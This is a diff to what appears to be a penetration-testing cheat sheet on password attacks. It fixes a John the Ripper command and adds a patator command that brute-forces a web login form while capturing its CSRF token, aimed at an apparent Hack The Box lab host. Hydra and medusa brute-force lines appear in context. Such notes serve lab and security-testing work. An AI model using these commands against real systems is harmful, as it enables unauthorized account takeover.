@@ -12,7 +12,7 @@ cewl -w createWordlist.txt -m 6 https://www.example.com
 
 ## Improve the custom wordlist
 ```
-john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
+john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
 ```
 
 # Offline password cracking
@@ -51,6 +51,11 @@ hydra -l root -P wordlist.txt 192.168.0.101 ssh
 ## Port 80/443 htaccess
 ```
 medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+```
+
+## Port 80 Http Form with CSRF Token
+```
+patator http_fuzz url=http://monitor.bart.htb/ method=POST body='csrf=_CSRF_&user_name=Daniel&user_password=FILE0&action=login' 0=custom_wordlist.txt follow=1 accept_cookie=1 -x ignore:fgrep='The information is incorrect.' before_urls="http://monitor.bart.htb/" before_egrep='_CSRF_:name="csrf" value="(\w+)"'
 ```
 
 ## Port 161 - SNMP
